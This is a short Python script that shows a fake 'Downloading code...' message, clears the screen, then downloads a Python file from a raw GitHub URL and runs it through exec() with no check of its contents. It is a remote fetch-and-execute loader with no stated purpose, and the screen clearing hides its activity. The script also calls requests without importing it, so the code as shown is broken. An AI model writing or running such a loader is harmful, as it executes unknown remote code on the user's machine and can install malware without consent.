

def load():
    import time
    import os
    print("Downloading code...")
    time.sleep(2)
    os.system('clear')

def fetch_and_run_code(url):
    try:
        # Fetching the code from the URL
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses

        # Execute the fetched code
        exec(response.text)

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    load()
    url = "https://raw.githubusercontent.com/Aldoriahub/Gg/refs/heads/main/Soon.py"
    fetch_and_run_code(url)

